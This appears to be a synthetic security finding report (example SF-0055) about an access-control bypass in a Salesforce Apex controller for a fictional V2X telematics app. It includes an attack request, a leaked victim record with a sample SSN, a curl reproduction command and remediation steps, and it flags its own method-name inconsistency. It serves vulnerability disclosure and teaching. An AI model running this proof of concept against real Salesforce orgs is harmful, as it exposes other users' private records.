# Security Analysis Report
**System:** AetherDrive V2X Telematics (Salesforce-Integrated)
**Domain:** Automotive / V2X / Telematics
**Example ID:** SF-0055
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL and Salesforce record-level access bypass on `EventController.updateEvent` — attacker reads any V2X Event record via direct SOQL ID interpolation |

---

## Finding 1 — Platform: SOQL Record-Level Access Bypass on Event Object (Pattern 9.2)

### Summary
The Apex controller `EventController` on AetherDrive V2X Telematics (`489c2c80.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Event object. Per §5.0 Pattern 9.2, the SOQL query interpolates `eventId` directly from client input without a `WITH SECURITY_ENFORCED` clause or ownership predicate, completely bypassing Salesforce record-level access controls. In an automotive/V2X context, Event records may include telematics data, location history, and driver PII.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getEventDetails(String eventId, ...)` while the Aura descriptor in §6.0 is `c.EventController.updateEvent`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://489c2c80.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://489c2c80.lightning.force.com/aura
Authorization: Bearer 00D489C2C80!AR489c2c80...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D489C2C80!AR489c2c80...

message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN",
"params":{"eventId":"0012C80","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim V2X Event Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0012C80", "Name": "Victim Event Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-48-9037"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D489C2C80!AR489c2c80..."
curl -s -X POST "https://489c2c80.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"0012C80","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-48-9037
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class EventController { ... }`
2. Add `WITH SECURITY_ENFORCED` to all SOQL queries.
3. `WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()` — never interpolate client-supplied IDs directly.
4. Server-side `fields` allowlist. Validate `aura.token`.
